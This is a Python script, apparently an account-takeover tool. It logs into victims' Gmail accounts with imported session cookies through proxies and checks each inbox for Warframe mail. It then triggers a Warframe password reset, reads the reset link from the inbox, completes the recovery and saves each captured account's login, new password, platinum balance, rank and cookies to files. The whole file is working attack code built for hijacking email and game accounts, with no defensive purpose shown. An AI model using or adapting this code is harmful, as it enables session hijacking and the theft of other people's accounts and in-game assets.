from bs4 import BeautifulSoup
import queue
from loguru import logger
from warframe import Warframe
import os
from anticaptchaofficial.recaptchav3enterpriseproxyless import *


class Gmail:
    def __init__(self, cookies, proxy, thread_name):
        self.thread_name = thread_name
        self.email = None
        self.cookies_text = cookies
        self.proxy = proxy
        self.queue = queue.Queue()
        self.email_number = 0
        self.email_array = []
        self.headers = None
        self.session = self.generate_session()
        self.session.proxies.update(self.proxy)
        self.check_mails()

    def check_mails(self):
        if self.login_to_gmail() is True:
            for i in range(10):
                self.get_headers()
                for i in range(10):
                    self.email = None
                    answer = self.get_gm()
                    if answer is True:
                        self.get_mails()
                        self.email_number += 1
                        break
                    if answer == "EMAIL_REPEAT":
                        return
        else:
            logger.error(f"[{self.thread_name}] Cookies not valid")
            return

    def netscape_to_list(self) -> list:
        converted = []
        text = self.cookies_text.split("\n")
        for line in text:
            try:
                line = line.split("\t")
                if len(line) != 7:
                    continue
                converted.append(
                    {
                        "domain": line[0].strip(),
                        "name": line[5].strip(),
                        "value": line[6].strip(),
                    }
                )
            except:
                pass
        return converted

    def generate_session(self) -> requests.Session:
        headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 Safari/537.36"}
        session = requests.Session()
        session.headers = headers
        cookie_jar = self.netscape_to_list()
        for cookie in cookie_jar:
            session.cookies.set(cookie["name"], cookie["value"], domain=cookie["domain"])
        return session

    def login_to_gmail(self):
        resp = self.session.get("https://mail.google.com/mail/&ogbl", headers=self.headers)
        if "https://mail.google.com/mail/u" in resp.url:
            return True
        return False

    def get_gm(self):
        try:
            resp = self.session.get(f"https://mail.google.com/mail/u/{self.email_number}/", headers=self.headers)
            soup = BeautifulSoup(resp.text, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if 'var GLOBALS=[' in script.text:
                    vars = script.text.split(",")
                    for el in vars:
                        if "@gmail.com" in el:
                            email = el.replace('"', '')
                            self.email = email
                            if self.email in self.email_array:
                                return "EMAIL_REPEAT"
                            else:
                                self.email_array.append(self.email)
                if 'GM_ID_KEY=' in script.text:
                    vars = script.text.split(";")
                    for el in vars:
                        if "var GM_ID_KEY=" in el:
                            gm = el.replace('var GM_ID_KEY="', "").replace('"', '')
                            header = json.loads(self.headers['x-gmail-btai'])
                            header['5'] = gm.strip()
                            new_header = json.dumps(header)
                            self.headers['x-gmail-btai'] = new_header
            if self.email is not None:
                return True
            else:
                return False
        except:
            print("Error with get_gm")
            return False

    def get_mails(self):
        try:
            data = {"1":{"1":79,"2":51,"4":"warframe.com","5":{"5":0,"12":"1653579342859","13":10800000,"24":0,"25":0,"26":0,"27":0},"6":"itemlist-ViewType(79)-7","7":1,"8":1000,"10":0,"14":1,"16":{"1":1,"2":0,"3":0,"8":"118D3518-99E6-4F6A-B1FE-363BEE24C837","10":1,"13":2},"19":1,"22":0,"23":1,"24":0,"25":{},"26":0},"3":{"1":"1693","2":5,"5":1,"6":1,"7":2}}
            resp = self.session.post(f"https://mail.google.com/sync/u/{self.email_number}/i/bv?hl=en&c=16", headers=self.headers, json=data)
            try:
                counter = len(resp.json()["3"])
            except:
                counter = 0
            if counter > 0:
                mail_data = {"email": self.email, "mail_id": self.email_number, "cookies": self.cookies_text, "timestamp": int(time.time()) * 1000}
                logger.info(f"[{self.thread_name}] {self.email} have warframe mails, initialize password recovery")
                warframe = Warframe(self.email, self.proxy)
                while True:
                    answer = warframe.make_recovery()
                    if answer is True:
                        break
                link = self.start_check_mails(mail_data)
                if link is not None:
                    data = warframe.confirm_recovery(link)
                    if data is not None:
                        logger.success(f"[{self.thread_name}] {data['email']} has been successfully restored")
                        write_success(data, self.cookies_text)
                    else:
                        logger.error(f"[{self.thread_name}] Error during {self.email} recovery")
            if counter == 0:
                logger.info(f"[{self.thread_name}] {self.email} has no mails")
        except Exception as err:
            print(err, "err")
            return False

    def check_new_mails(self, mail_data):
        for i in range(60):
            data = {"1": {"1": 79, "2": 51, "4": "warframe.com",
                          "5": {"5": 0, "12": "1653579342859", "13": 10800000, "24": 0, "25": 0, "26": 0, "27": 0},
                          "6": "itemlist-ViewType(79)-7", "7": 1, "8": 1000, "10": 0, "14": 1,
                          "16": {"1": 1, "2": 0, "3": 0, "8": "118D3518-99E6-4F6A-B1FE-363BEE24C837", "10": 1, "13": 2},
                          "19": 1, "22": 0, "23": 1, "24": 0, "25": {}, "26": 0},
                    "3": {"1": "1693", "2": 5, "5": 1, "6": 1, "7": 2}}
            resp = self.session.post(f"https://mail.google.com/sync/u/{mail_data['mail_id']}/i/bv?hl=en&c=16",
                                     headers=self.headers, json=data)
            try:
                counter = len(resp.json()["3"])
            except:
                counter = 0
            if counter > 0:
                for el in resp.json()['3']:
                    if el['1']['1'] == "Warframe Password Reset":
                        for mail in el['1']['5']:
                            if int(mail["7"]) > mail_data['timestamp']:
                                return self.read_email_mails(mail_data['mail_id'], el['1']['4'], mail['1'])
            time.sleep(1)

    def read_email_mails(self, mail_id, group_id, letter_id):
        temp_headers = self.headers
        temp_headers['x-gmail-btai'] = '''[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,"en","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 Safari/537.36",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,"d35f046863",null,25,"gmail.pinto-server_20220905.06_p1",1,5,"",10800000,"+03:00",1,null,472559295,"","",1663254692257]'''
        data = [[[group_id, 1, None, None, 1]], 1]
        resp = self.session.post(f"https://mail.google.com/sync/u/{mail_id}/i/fd?hl=en&c=0&rt=r&pt=ji", headers=temp_headers, json=data).json()
        for mail in resp[1][0][2]:
            if mail[0] == letter_id:
                body = mail[1][5][1][0][2][1]
                soup = BeautifulSoup(body, "lxml")
                return soup.find_all("a", href=True)[0]['href']
        return None

    def start_check_mails(self, mail_data):
        link = self.check_new_mails(mail_data)
        print(link)
        if link is not None:
            return link
        else:
            logger.error(f"[{self.thread_name}] Cookies not valid")
            return None

    def get_headers(self):
        self.headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ru,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://mail.google.com',
            'pragma': 'no-cache',
            'referer': 'https://mail.google.com/mail/u/0/',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Yandex";v="22"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 Safari/537.36',
            'x-gmail-btai': '{"3":{"6":0,"10":1,"13":1,"15":0,"16":1,"17":1,"18":0,"19":1,"22":1,"23":1,"24":1,"25":1,"26":1,"27":1,"28":1,"29":0,"30":1,"31":1,"32":1,"33":1,"34":1,"35":0,"36":1,"37":"ru","38":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36","39":1,"40":0,"41":25,"43":0,"44":1,"45":0,"46":1,"47":1,"48":1,"49":1,"50":1,"52":1,"53":1,"54":0,"55":1,"56":1,"57":0,"58":0,"60":0,"61":1,"62":0,"63":1,"64":1,"66":1,"67":1,"69":1,"70":0,"71":1,"72":0},"5":"a9f008efe4","7":25,"8":"gmail.pinto-server_20220518.05_p2","9":1,"10":5,"11":"","12":10800000,"13":"+03:00","14":1,"16":450029178,"17":"","18":"","19":"1653579497977","21":"1693"}',
        }
        return self.headers


def write_success(data, cookies):
    folder_name = f"Платина {data['platinum']} Ранг {data['masteryRank']} [{data['name']}]"
    try:
        os.mkdir(f"Result/{folder_name}")
        account_info = f'''Платина: {data["platinum"]}\nРанг: {data["masteryRank"]}\n\nПочта: {data["email"]}\n\nЛогин: {data["name"]}\nПароль: {data["password"]}'''
        with open(f"Result\\{folder_name}\\AccountInfo.txt", "w") as f:
            f.write(account_info)
        with open(f"Result\\{folder_name}\\Cookies.txt", "w") as f:
            f.write(cookies)
        return True
    except Exception as err:
        print(err)
        return False